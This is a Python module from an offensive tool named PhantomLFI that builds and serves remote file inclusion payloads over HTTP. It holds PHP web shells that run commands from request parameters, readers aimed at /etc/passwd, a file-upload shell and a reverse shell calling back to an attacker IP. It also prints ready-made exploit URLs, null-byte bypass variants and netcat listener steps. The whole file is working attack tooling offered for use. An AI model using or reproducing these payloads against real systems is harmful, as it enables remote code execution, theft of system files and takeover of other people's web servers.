"""
RFI payload server for PhantomLFI.
Creates shell payloads and serves them via HTTP for RFI exploitation.
Done by D4rk0ps
"""

import os
import sys
import threading
import http.server
import socketserver
import signal

from core.utils import print_colored


# =====================================================================
# Shell Payloads
# =====================================================================

SHELLS = {
    "shell.txt": '<?php system($_GET["cmd"]); ?>',
    "shell.php": '<?php system($_GET["cmd"]); ?>',
    "cmd.php": '<?php echo "<pre>"; passthru($_GET["cmd"]); echo "</pre>"; ?>',
    "exec.php": '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>',
    "eval.php": '<?php eval($_POST["cmd"]); ?>',
    "info.php": "<?php phpinfo(); ?>",
    "read.php": '<?php echo file_get_contents($_GET["f"]); ?>',
    "upload.php": """<?php
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: " . $_FILES['f']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f"><input type="submit" value="Upload">
</form>""",
    "b64.php": """<?php
echo "<pre>";
echo base64_encode(file_get_contents($_GET["f"]));
echo "</pre>";
?>""",
    "multi.php": """<?php
if(isset($_GET["cmd"])) { echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; }
if(isset($_GET["f"])) { echo "<pre>" . htmlspecialchars(file_get_contents($_GET["f"])) . "</pre>"; }
if(isset($_GET["phpinfo"])) { phpinfo(); }
?>""",
    "revshell.php": """<?php
$ip = '$ATTACKER_IP$';
$port = $REV_PORT$;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>""",
}


def create_payloads_dir(serve_dir: str, attacker_host: str, rev_port: int = 4444):
    """Create the payloads directory with shell files.

    Args:
        serve_dir: Directory to create payload files in.
        attacker_host: Attacker IP for reverse shell.
        rev_port: Reverse shell port.
    """
    os.makedirs(serve_dir, exist_ok=True)

    for filename, content in SHELLS.items():
        # Replace placeholders in reverse shell
        content = content.replace("$ATTACKER_IP$", attacker_host)
        content = content.replace("$REV_PORT$", str(rev_port))

        filepath = os.path.join(serve_dir, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)


class QuietHTTPHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler with custom logging."""

    def __init__(self, *args, use_color=True, **kwargs):
        self.use_color = use_color
        super().__init__(*args, **kwargs)

    def log_message(self, format, *args):
        """Log incoming requests with color."""
        msg = f"  [HIT] {self.client_address[0]} → {args[0]}"
        print_colored(msg, "green", self.use_color)


def run_serve(
    base_url: str,
    attacker_host: str,
    port: int = 80,
    rev_port: int = 4444,
    use_color: bool = True,
):
    """Start the RFI payload server.

    Creates shell files and serves them via HTTP. Prints ready-to-use
    RFI payload URLs.

    Args:
        base_url: Target URL with injectable parameter.
        attacker_host: Attacker IP/hostname.
        port: HTTP server port.
        rev_port: Reverse shell callback port.
        use_color: Whether to use colored output.
    """
    serve_dir = os.path.join("/tmp", "phantomlfi_serve")
    create_payloads_dir(serve_dir, attacker_host, rev_port)

    # --- Print Header ---
    print_colored("\n  ╔══════════════════════════════════════════╗", "cyan", use_color)
    print_colored("  ║       PhantomLFI — RFI Payload Server    ║", "cyan", use_color)
    print_colored("  ╚══════════════════════════════════════════╝", "cyan", use_color)

    print_colored(f"\n  Attacker Host : {attacker_host}", "white", use_color)
    print_colored(f"  Server Port   : {port}", "white", use_color)
    print_colored(f"  RevShell Port : {rev_port}", "white", use_color)
    print_colored(f"  Serving From  : {serve_dir}/", "white", use_color)

    # --- Print Generated Files ---
    print_colored(f"\n  {'─' * 55}", "white", use_color)
    print_colored("  Generated Payloads:\n", "yellow", use_color)

    for filename, description in [
        ("shell.txt", "system() via GET ?cmd="),
        ("shell.php", "system() via GET ?cmd="),
        ("cmd.php", "passthru() via GET ?cmd="),
        ("exec.php", "shell_exec() via GET ?cmd="),
        ("eval.php", "eval() via POST cmd="),
        ("info.php", "phpinfo()"),
        ("read.php", "file read via GET ?f=/etc/passwd"),
        ("upload.php", "file upload form"),
        ("b64.php", "base64 file read via GET ?f="),
        ("multi.php", "multi-tool: ?cmd= / ?f= / ?phpinfo"),
        ("revshell.php", f"reverse shell → {attacker_host}:{rev_port}"),
    ]:
        print_colored(f"    {filename:<16} — {description}", "green", use_color)

    # --- Print Ready-to-Use RFI URLs ---
    print_colored(f"\n  {'─' * 55}", "white", use_color)
    print_colored("  Ready-to-Use RFI Payloads:\n", "yellow", use_color)

    port_str = f":{port}" if port != 80 else ""

    rfi_urls = [
        (
            "Command Exec",
            f"{base_url}http://{attacker_host}{port_str}/shell.txt&cmd=id",
        ),
        (
            "Command Exec",
            f"{base_url}http://{attacker_host}{port_str}/cmd.php&cmd=whoami",
        ),
        (
            "Exec (alt)",
            f"{base_url}http://{attacker_host}{port_str}/exec.php&cmd=ls+-la",
        ),
        (
            "PHP Info",
            f"{base_url}http://{attacker_host}{port_str}/info.php",
        ),
        (
            "File Read",
            f"{base_url}http://{attacker_host}{port_str}/read.php&f=/etc/passwd",
        ),
        (
            "B64 Read",
            f"{base_url}http://{attacker_host}{port_str}/b64.php&f=/etc/passwd",
        ),
        (
            "Upload",
            f"{base_url}http://{attacker_host}{port_str}/upload.php",
        ),
        (
            "Multi-tool",
            f"{base_url}http://{attacker_host}{port_str}/multi.php&cmd=id",
        ),
        (
            "RevShell",
            f"{base_url}http://{attacker_host}{port_str}/revshell.php",
        ),
    ]

    for label, url in rfi_urls:
        print_colored(f"    [{label:<12}] {url}", "cyan", use_color)

    # --- Null byte variants ---
    print_colored(f"\n  {'─' * 55}", "white", use_color)
    print_colored("  With Null Byte Bypass:\n", "yellow", use_color)

    for null in ["%00", "%00.php", "%00.html"]:
        url = f"{base_url}http://{attacker_host}{port_str}/shell.txt{null}"
        print_colored(f"    {url}", "magenta", use_color)

    # --- Reverse Shell Instructions ---
    print_colored(f"\n  {'─' * 55}", "white", use_color)
    print_colored("  Reverse Shell Setup:\n", "yellow", use_color)
    print_colored(f"    1. Start listener:  nc -lvnp {rev_port}", "white", use_color)
    print_colored(
        f"    2. Trigger:         {base_url}http://{attacker_host}{port_str}/revshell.php",
        "white",
        use_color,
    )
    print_colored(f"    3. Catch shell on:  {attacker_host}:{rev_port}", "white", use_color)

    # --- Start HTTP Server ---
    print_colored(f"\n  {'═' * 55}", "cyan", use_color)
    print_colored(
        f"  [*] Starting HTTP server on 0.0.0.0:{port} ...",
        "green",
        use_color,
    )
    print_colored("  [*] Press Ctrl+C to stop\n", "white", use_color)

    os.chdir(serve_dir)

    handler = lambda *args, **kwargs: QuietHTTPHandler(
        *args, use_color=use_color, **kwargs
    )

    try:
        with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print_colored("\n\n  [*] Server stopped", "red", use_color)
    except OSError as e:
        if "Address already in use" in str(e):
            print_colored(
                f"\n  [!] Port {port} is already in use. Try --port {port + 1}",
                "red",
                use_color,
            )
        else:
            print_colored(f"\n  [!] Error: {e}", "red", use_color)
